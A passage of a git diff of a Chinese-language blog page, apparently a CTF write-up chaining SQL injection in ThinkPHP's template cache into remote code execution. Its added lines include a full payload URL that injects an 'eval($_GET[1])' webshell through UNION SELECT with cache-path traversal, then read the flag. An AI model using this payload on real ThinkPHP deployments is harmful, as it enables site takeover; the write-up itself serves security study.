+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">filemtime</span><span class="p">(</span><span class="nv">$layoutFile</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">Storage</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="nv">$tmplCacheFile</span><span class="p">,</span> <span class="s1">&#39;mtime&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="k">function</span> <span class="nf">checkContentCache</span><span class="p">(</span><span class="nv">$tmplContent</span><span class="p">,</span> <span class="nv">$prefix</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">Storage</span><span class="o">::</span><span class="na">has</span><span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;CACHE_PATH&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$prefix</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$tmplContent</span><span class="p">)</span> <span class="o">.</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHFILE_SUFFIX&#39;</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个类的run方法，恰好也是使用了md5的content的值进行文件的命名，最后走到Storage::load其实也就是调用了文件包含的include方法。那么我们就有了思路，将cache的key的值构造成之前show函数中传入的base64_encode($content[&lsquo;content&rsquo;])的值，同时将生成缓存文件路径即options[&rsquo;temp&rsquo;]的位置替换成C(&lsquo;CACHE_PATH&rsquo;) . $_data[&lsquo;prefix&rsquo;]，就可以完美的进行cache的覆盖，从而让server加载我们写入的webshell缓存。</p>
+<p>所以步骤如下：
+<figure><img
+        
+        loading="lazy"
+        src="img/sql-rce/tp4.png"
+        srcset="img/sql-rce/tp4.png, img/sql-rce/tp4.png 1.5x, img/sql-rce/tp4.png 2x"
+        alt="img/sql-rce/tp4.png"
+        title="img/sql-rce/tp4.png" ></figure>
+获取cid为2的content的base64的值。（不要在意其他的，都是debug时候自己加的东西）</p>
+<p>步骤二：
+playload:http://192.168.43.146/N1start/tp/index.php//?s=home/index/page&amp;cid[where]=1=0%20union%20select%20%27%0D%0Aeval($_GET[1]);//%27;&amp;cid[cache][key]=VGhpcyBpcyB0aGUgY29udGVudCBvZiB0aGUgc2Vjb25kIGFydGljbGU=&amp;cid[cache][temp]=../tp/Application/Runtime/Cache/Home/
+<figure><img
+        
+        loading="lazy"
+        src="img/sql-rce/tp2.png"
+        srcset="img/sql-rce/tp2.png, img/sql-rce/tp2.png 1.5x, img/sql-rce/tp2.png 2x"
+        alt="img/sql-rce/tp2.png"
+        title="img/sql-rce/tp2.png" ></figure>
+最后直接rce
+<figure><img
+        
+        loading="lazy"
+        src="img/sql-rce/tp3.png"
+        srcset="img/sql-rce/tp3.png, img/sql-rce/tp3.png 1.5x, img/sql-rce/tp3.png 2x"
+        alt="img/sql-rce/tp3.png"
+        title="img/sql-rce/tp3.png" ></figure>
+直接cat /flag即可</p></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2024-02-06</span>
+                <span>Updated on 2024-02-02</span>
             </div>
             <div class="post-info-license"></div>
         </div>
@@ -120,20 +736,19 @@
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/thinkphp/">Thinkphp</a>,&nbsp;<a href="/tags/php/">PHP</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/sictf/" class="prev" rel="prev" title="SICTF"><i class="fas fa-angle-left fa-fw"></i>SICTF</a>
-            <a href="/posts/%E5%A4%A9%E5%B1%B1/" class="next" rel="next" title="天山">天山<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/posts/nosql-inject/" class="prev" rel="prev" title="nosql-inject(mangodb and influxdb)"><i class="fas fa-angle-left fa-fw"></i>nosql-inject(mangodb and influxdb)</a></div>
 </div>
-</article></div>
+<div id="comments"></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
                     Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
@@ -144,7 +759,7 @@
         </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"desktop-header-typeit":"DELETE's blog","mobile-header-typeit":"DELETE's blog"},"typeit":{"cursorChar":null,"cursorSpeed":null,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":null,"speed":null}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
 </body>
 
 </html>
